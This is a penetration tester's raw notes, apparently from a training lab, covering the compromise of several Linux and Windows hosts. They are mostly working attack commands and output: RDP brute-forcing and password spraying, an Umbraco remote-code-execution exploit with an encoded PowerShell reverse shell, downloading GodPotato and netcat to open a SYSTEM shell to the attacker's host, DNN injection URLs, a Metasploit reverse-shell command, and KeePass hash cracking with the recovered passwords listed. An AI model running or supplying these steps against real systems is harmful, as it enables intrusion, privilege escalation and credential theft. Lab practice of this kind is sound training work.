$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@demo:/$ whoami
www-data

www-data@demo:/$ sudo -l
Matching Defaults entries for www-data on demo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
User www-data may run the following commands on demo:
    (ALL) NOPASSWD: ALL


			Priv Esc: www-data to root
www-data@demo:/$ sudo -i
sudo -i

root@demo:~# whoami
root

root@demo:~# cat proof.txt
02f4fcf5fcb1fed720457bf438e3608c

root@demo:~# find / -name "local.txt" -ls 2> /dev/null
   263520      4 -rw-r--r--   1 root     root           33 Apr 26 09:46 /home/anita/local.txt

root@demo:~# find / -name "proof.txt" -ls 2> /dev/null
find / -name "proof.txt" -ls 2> /dev/null
   262946      4 -rw-r--r--   1 root     root           33 Apr 26 09:46 /root/proof.txt


--------------------------------------------------------------------------------------------------
			3. WEB02.DMZ.RELIA.COM: 192.168.200.247 ✅
RDP:3389, 
FTP:14020, 
HTTP:80 443 14080 47001, 
SMB:149 445, 
RPC:135, 
WINRM:5985

WAPPALIZER:
Web servers
- Microsoft HTTPAPI 2.0
- Apache HTTP Server 2.4.54
Programming languages
- PHP 8.1.10
Operating systems
- Windows Server
Web server extensions
- OpenSSL 1.1.1p

			RDP: Brute force 
hydra -l zachary -P /usr/share/wordlists/rockyou.txt rdp://192.168.206.247
hydra -l emma -P /usr/share/wordlists/rockyou.txt rdp://192.168.206.247

xfreerdp /u:emma /v:192.168.206.247
[3389][rdp] host: 192.168.206.247   login: emma   password: maritza
[3389][rdp] host: 192.168.206.247   login: emma   password: samsam
[3389][rdp] host: 192.168.206.247   login: emma   password: ivonne
[3389][rdp] host: 192.168.206.247   login: zachary   password: ladybug1

xfreerdp /u:emma /p:fire /v:192.168.233.247
xfreerdp /u:zachary /p: /v:192.168.233.247
xfreerdp /u:zachary /p:OathDeeplyReprieve91 /v:192.168.233.247

			SPRAY AND PRAY:
WINRM:
evil-winrm -i 192.168.233.247 -u mark -p OathDeeplyReprieve91 

SMB:
┌──(kali㉿kali)-[~]
└─$ impacket-psexec mark:OathDeeplyReprieve91@192.168.233.247 cmd.exe
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[*] Requesting shares on 192.168.233.247.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

WMI:
┌──(kali㉿kali)-[~]
└─$ impacket-wmiexec relia/mark:'OathDeeplyReprieve91'@192.168.200.247 cmd.exe
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

USERS/PASS:
mark:OathDeeplyReprieve91
zachary
emma

USERS:
root
offsec
anita:fireball
miranda
steven
mark

		DOCUMENTS: Mission.pdf  'Policies (2).pdf'   WelcomeLetter.pdf
exiftool -a -u Mission.pdf 
Creator                         : zachary
Author                          : zachary
exiftool -a -u Policies\ \(2).pdf 
Author                          : RELIA\Administrator \(Automatic\)
Creator                         : Emma
exiftool -a -u WelcomeLetter.pdf  
Author                          : zachary
Creator                         : emma


				FTP:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp#ftpbounce-attack
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file

ftp://anonymous:anonymous@192.168.233.247:14020
wget -m ftp://anonymous:anonymous@192.168.233.247:14020

FTP [*] ftp found on tcp/14020.
14020/tcp open  ftp           syn-ack ttl 125 FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
|_ftp-bounce: bounce working!
14020/tcp open  ftp     syn-ack ttl 125 FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
| banner: 220 RELIA FTP Server for DEV resources. Please contact your man
|_ager for access.
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

┌──(kali㉿kali)-[~/Downloads/192.168.206.247:14020]
└─$ exiftool -a -u umbraco.pdf 
ExifTool Version Number         : 12.76
File Name                       : umbraco.pdf
Directory                       : .
File Size                       : 238 kB
File Modification Date/Time     : 2022:11:04 00:00:00-04:00
File Access Date/Time           : 2024:04:11 09:41:44-04:00
File Inode Change Date/Time     : 2024:04:11 09:41:44-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Create Date                     : 2019:01:17 16:13:30-05:00
Modify Date                     : 2022:11:04 09:29:15+01:00
Producer                        : RELIA Internal Procedure
Has XFA                         : No
XMP Toolkit                     : Adobe XMP Core 8.0-c001 79.328f76e, 2022/08/01-19:10:29
Format                          : application/pdf
Producer                        : RELIA Internal Procedure
Create Date                     : 2019:01:17 16:13:30-05:00
Metadata Date                   : 2022:11:04 09:29:15+01:00
Modify Date                     : 2022:11:04 09:29:15+01:00
Document ID                     : uuid:4f3487b8-1450-495f-9a59-0f7d3e6f479a
Instance ID                     : uuid:a2ea175e-127d-434c-9927-7d2a6b3a5f13
Page Count                      : 1

Installing Umbraco 7
• For Umbraco 7 the requirements are
o IIS 7 or higher
• Database, one of the following: SQL CE, SQL Server 2008 or higher or MySQL with support
for case insensitive queries)
• ASP.NET 4.5 or 4.5.1. Full-Trust
• Ability to set file/folder permissions for the user that "owns" the Application Pool
• You can use the user account "mark" (@relia.com) for basic configuration of the Umbraco
instances on IIS servers (pass "OathDeeplyReprieve91").
o Please DO NOT share this password with anyone outside the dev team.
• IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
o e.g. web02.relia.com, not just web02.

Manual installation of Umbraco
1. Download the files from our.umbraco.org/download and unzip them in a folder.
2. Set up web server hosting the folder you chose. Although IIS is a requirement for production
sites, it runs fine for development in IIS Express.
3. Set up file permissions for the folder. For development server it is okey to have full
read/write/modify permissions for the process serving the web page (AppPool or Network
service)
4. If you want to set up Umbraco on Sql Server or Mysql, download and install it. Make a new
database for Umbraco, and remember Connectionstring details, inccluding database name,
user and password
5. Open your site at localhost, and follow the wizard to set up your site with the database.

Install Umbraco with NuGet
1. Check for updates to the Nuget package manager. In Visual Studio: Tools > Extensions and
Updates > Updates > Visual Studio Gallery. Install if availalbe
2. Create a new web application with template "ASP.NET Web Application with an Empty
template" on .NET Framework 4.5.1
3. Open the package manager console and run Install-Package UmbracoCms
4. Press F5 to build and run your new website.
5. Complete the wizard to choose database provider and set up your site.


				PORT SCAN:
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.200.247
RDP:
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2024-04-27T00:47:23+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-27T00:47:16+00:00
| ssl-cert: Subject: commonName=WEB02
| Issuer: commonName=WEB02
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-29T21:13:19
| Not valid after:  2024-09-28T21:13:19
| MD5:   8de7:aa77:1bb9:b1b4:7171:2165:9190:97ee
| SHA-1: 12d0:4d32:f6d1:a78c:ed60:a39a:1d00:014f:e09f:efa7
FTP:
14020/tcp open  ftp           syn-ack FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
HTTP: 80 443 5985 14080 47001
80/tcp    open  http          syn-ack Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-title: RELIA - New Hire Information
443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: RELIA - New Hire Information
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
RPC:
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
SMB:
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| smb2-time: 
|   date: 2024-04-27T00:47:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61340/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44020/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 53552/udp): CLEAN (Timeout)
|   Check 4 (port 42619/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1s, deviation: 0s, median: -1s


			HTTP: 80 443 5985 14080 47001 49683
Web servers
- Microsoft HTTPAPI 2.0
- Apache 2.4.54
Programming languages
- PHP 8.1.10

searchsploit Apache 2.4.54 
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Executio | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scan | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service            | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Ov | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer  | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer  | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Trav | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing              | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal            | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)      | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)   | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Rem | linux/remote/34.pl

searchsploit PHP 8.1.10
Linux/x64 - Reverse (192.168.1.10:31337/TCP) Shell Shellcode ( | linux_x86-64/43599.c
Linux/x86 - Reverse (192.168.1.10:31337/TCP) Shell Shellcode ( | linux_x86/25497.c

searchsploit umbraco 
Umbraco CMS - Remote Command Execution (Metasploit)            | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution     | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)     | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                        | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting     | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                               | aspx/webapps/50462.txt


http://192.168.200.247:14080/
Bad Request - Invalid Hostname
HTTP Error 400. The request hostname is invalid.

umbraco.pdf:
• You can use the user account "mark" (@relia.com) for basic configuration of the Umbraco
instances on IIS servers (pass "OathDeeplyReprieve91").
o Please DO NOT share this password with anyone outside the dev team.
• IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
o e.g. web02.relia.com, not just web02.

sudo nano /etc/hosts
192.168.200.247	web02.relia.com
http://web02.relia.com:14080/

				RCE: Umbraco
searchsploit umbraco 
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)     | aspx/webapps/49488.py
https://www.exploit-db.com/exploits/49488

python3 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i 'http://web02.relia.com:14080/' -c "whoami"
iis apppool\defaultapppool

nc -nvlp 4444  

https://www.revshells.com/
python3 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i 'http://web02.relia.com:14080/' -c "powershell" -a "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool

PS C:\windows\system32\inetsrv> hostname
WEB02

PS C:\windows\system32\inetsrv> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/26/2024   4:51 PM             34 local.txt  

PS C:\windows\system32\inetsrv> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue

PS C:\windows\system32\inetsrv> type C:\local.txt
6db72f4cea1e40346de1d1094a4f7e47



			PRIV ESC: iis apppool\defaultapppool to Admin
PS C:\windows\system32\inetsrv> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


SeImpersonatePrivilege: GodPotato
https://github.com/BeichenDream/GodPotato
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer

python3 -m http.server 5555
PS C:\Users\Public> cd Downloads
PS C:\Users\Public> iwr -uri http://192.168.45.170:5555/GodPotato-NET4.exe -Outfile GodPotato.exe
PS C:\Users\Public> .\GodPotato.exe -cmd "cmd /c whoami"
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE

nc -nvlp 2560 
PS C:\Users\Public> iwr -uri http://192.168.45.170:5555/nc64.exe -Outfile nc64.exe
PS C:\Users\Public> .\GodPotato.exe -cmd "C:\Users\Public\Downloads\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.170 2560"

nc -nvlp 2560                                                                        
listening on [any] 2560 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.200.247] 49818

C:\Users\Public\Downloads> whoami
nt authority\system

C:\Users\Public\Downloads> hostname
WEB02

C:\Users\Public\Downloads> powershell -ep bypass

PS C:\Users\Public\Downloads> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/26/2024   4:51 PM             34 proof.txt   

PS C:\Users\Public\Downloads> type C:\Users\Administrator\Desktop\proof.txt
6f68828965c166268bb41c761269b54a


			CHECK FOR INTERNAL NETWORK: 
PS C:\Users\Public\Downloads> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.200.247
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.200.254

PS C:\Users\Public\Downloads> arp -a
Interface: 192.168.200.247 --- 0x4
  Internet Address      Physical Address      Type
  192.168.200.254       00-50-56-ab-a4-bb     dynamic   
  192.168.200.255       ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static  


--------------------------------------------------------------------------------------------------
			4. 192.168.200.248 ✅
RDP:3389, 
MSSQL:49965, 
HTTP:80 47001, 
SMB:139 445, 
RPC:135, 
WINMI:5985

			RDP: Brute force 
hydra -l emma -P /usr/share/wordlists/rockyou.txt rdp://192.168.200.248
hydra -l zachary -P /usr/share/wordlists/rockyou.txt rdp://192.168.200.248
hydra -l mark -P /usr/share/wordlists/rockyou.txt rdp://192.168.200.248

xfreerdp /u:emma /p:password /v:192.168.200.248
xfreerdp /u:zachary /p:OathDeeplyReprieve91 /v:192.168.200.248
xfreerdp /u:mark /p:OathDeeplyReprieve91 /v:192.168.200.248


			SPRAY AND PRAY:
WINRM:
evil-winrm -i 192.168.200.248 -u mark -p OathDeeplyReprieve91 
SMB:
┌──(kali㉿kali)-[~]
└─$ impacket-psexec mark:OathDeeplyReprieve91@192.168.200.248 cmd.exe
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[*] Requesting shares on 192.168.233.247.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
WMI:
┌──(kali㉿kali)-[~]
└─$ impacket-wmiexec relia/mark:'OathDeeplyReprieve91'@192.168.200.248 cmd.exe
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[*] SMBv3.0 dialect used
[-] rpc_s_access_denied


			MSSQL: [*] ms-sql-s found on tcp/49965.
searchsploit dnn        
DotNetNuke DNNArticle Module 10.0 - SQL Injection              | php/webapps/27602.txt
DotNetNuke DNNarticle Module 11 - Directory Traversal          | windows/webapps/44414.txt
DotNetNuke DNNspot Store 3.0.0 - Arbitrary File Upload (Metasp | windows/webapps/35039.rb

SQL
http://192.168.200.248/desktopmodules/dnnarticle/dnnarticlerss.aspx?moduleid=0&categoryid=1+or+1=@@version
DIRECTORY TRAV
http://192.168.200.248/desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config&smid=512&portalid=3
MSF
msfcli exploit/windows/http/dnnspot_upload_exec payload=windows/shell/reverse_tcp LHOST=192.168.45.170 LPORT=5555 RHOST=192.168.200.248 RPORT=80 E

wwwroot:
smb: \r14_2022\build\DNN\> ls 
  .                                   D        0  Thu Oct 13 13:19:08 2022
  ..                                  D        0  Thu Oct 13 13:19:08 2022
  wwwroot                             D        0  Thu Oct 20 06:40:13 2022

  <!-- Connection String for SQL Server 2008/2012 Express -->
    <add name="SiteSqlServer" connectionString="Data Source=.\SQLExpress;Initial Catalog=dnndatabase;User ID=dnnuser;Password=DotNetNukeDatabasePassword!" providerName="System.Data.SqlClient" />


				HTTP: 80 47001
DEFAULT LOGINS 
http://192.168.200.248/Login
http://192.168.200.248/Login?returnurl=%2fActivity-Feed
admin:password

SuperUser Account
User: admin
Email: emma@relia.com
Pass: password

				SMB ENUMERATION:
smbclient -L \\\\192.168.200.248\\
password
smbclient \\\\192.168.200.248\\transfer
smb: \> ls
smb: \> cd logs
smb: \logs\> cd build
smb: \logs\build\> cd materials
smb: \logs\build\materials\> cd assets
smb: \logs\build\materials\assets\> cd Databases
smb: \logs\build\materials\assets\Databases\> get Database.kdbx
smb: \logs\build\materials\assets\Databases\> get "Database (2).kdbx"

KeePass Files: 
https://fileinfo.com/extension/kdbx
https://www.keepersecurity.com/download.html
https://docs.keeper.io/en/v/secrets-manager/commander-cli/commander-installation-setup/installation-on-linux

DB-back (1)
smb: \> cd "DB-back (1)"
smb: \DB-back (1)\> cd  "New Folder"
smb: \DB-back (1)\New Folder\> cd Emma
smb: \DB-back (1)\New Folder\Emma\> cd Documents
smb: \DB-back (1)\New Folder\Emma\Documents\> get Database.kdbx

keepass2john Database.kdbx > keepass.hash
cat keepass.hash 
Database:$keepass$*2*60000*0*682a0e535986c0ab7f02ef294ddfdf869d39bf9e29e17a2d521eb0cdcbd744c0*3d7849d98a8eae59f70b27b1eba401db19dbbae8c095b8be52ef08ffd05a747a*c56d10e5ace50d5924d4b6a9781af20a*947c768ced6729f3741485b9f6ee0737ad70e11933ebdb727c627fe5bc66491a*55de9df220b1d816eb6bad76da248c383a8fde3dbfb2d77e3bb50a25b5ef6133
# REMOVE from .hash: Database:
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
$keepass$*2*60000*0*682a0e535986c0ab7f02ef294ddfdf869d39bf9e29e17a2d521eb0cdcbd744c0*3d7849d98a8eae59f70b27b1eba401db19dbbae8c095b8be52ef08ffd05a747a*c56d10e5ace50d5924d4b6a9781af20a*947c768ced6729f3741485b9f6ee0737ad70e11933ebdb727c627fe5bc66491a*55de9df220b1d816eb6bad76da248c383a8fde3dbfb2d77e3bb50a25b5ef6133:welcome1

keepassxc:
https://keepassxc.org/download/#linux
┌──(kali㉿kali)-[~]
└─$ keepassxc 
Database.kdbx
welcome1

EMMA
emma:SomersetVinyl1!
OLD
HabitsAgesEnd123

SQL
sa:SAPassword_1998

DEFAULT
USE FOR NEW DB:welcome1

RETIRED:
bo:Luigi=Papal1963

Michael321:12345

				LOCAL.txt: Emma
xfreerdp /u:emma /p:'SomersetVinyl1!' /v:192.168.200.248
25ab9902b31a58d4732db907f1c74894

PS C:\Users\emma> whoami
external\emma

PS C:\Users\emma> hostname
EXTERNAL

PS C:\Users\emma> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Users\emma> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.200.248
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.200.254

PS C:\Users\emma> arp -a
Interface: 192.168.200.248 --- 0x4
  Internet Address      Physical Address      Type
  192.168.200.254       00-50-56-ab-a4-bb     dynamic
  192.168.200.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 2560
C:\Users\emma\Downloads>powershell -ep bypass
PS C:\Users\emma\Downloads> .\winpea.exe

OS: Windows_NT
AppKey: !8@aBRBYdb3!

          ͹ System Environment Variables
  Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 25
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    PROCESSOR_REVISION: 0101
    AppKey: !8@aBRBYdb3!

          ͹ Logged users
    NT SERVICE\MSSQLFDLauncher$SQLEXPRESS
    NT SERVICE\MSSQL$SQLEXPRESS
    NT SERVICE\SQLTELEMETRY$SQLEXPRESS
    EXTERNAL\emma

                                   ͹ Network Information                                      

          ͹ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )
    transfer (Path: C:\transfer) -- Permissions: AllAccess
    Users (Path: C:\Users) -- Permissions: AllAccess

          ͹ Network Ifaces and known hosts
  The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:AB:BD:90]: 192.168.200.248 / 255.255.255.0
        Gateways: 192.168.200.254
        DNSs: 192.168.200.254
        Known hosts:
          169.254.169.254       00-00-00-00-00-00     Invalid
          192.168.50.254        00-00-00-00-00-00     Invalid
          192.168.200.254       00-50-56-AB-A4-BB     Dynamic
          192.168.200.255       FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


          ͹ Current UDP Listening Ports
  UDP        127.0.0.1             55741         *:*                            2392              svchost




			PROOF.txt: Priv Esc DLL HIJACKING - RABIT HOLE 
AppKey
SYSTEM
!8@aBRBYdb3! 
			͹ Scheduled Applications --Non Microsoft-- 
Check if you can modify other users scheduled binaries 
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries       
       
    (Administrator) BetaTask: C:\BetaMonitor\BetaMonitor.exe 
    Trigger: At system startup-After triggered, repeat every 00:01:00 for a duration of 1.00:00:00.
    

PS C:\BetaMonitor> Get-ScheduledTask
Get-ScheduledTask
TaskPath                                       TaskName                          State     
--------                                       --------                          -----     
\                                              BetaTask                          Ready   

PS C:\BetaMonitor> icacls C:\BetaMonitor\BetaMonitor.exe
C:\BetaMonitor\BetaMonitor.exe BUILTIN\Users:(I)(RX)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Administrators:(I)(F)


PS C:\BetaMonitor> type BetaMonitor.log
[2024-04-27_04:45:03.6030] Coudln't find BetaLibrary.Dll.


PS C:\BetaMonitor> $env:path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Users\emma\AppData\Local\Microsoft\WindowsApps;


$env:path
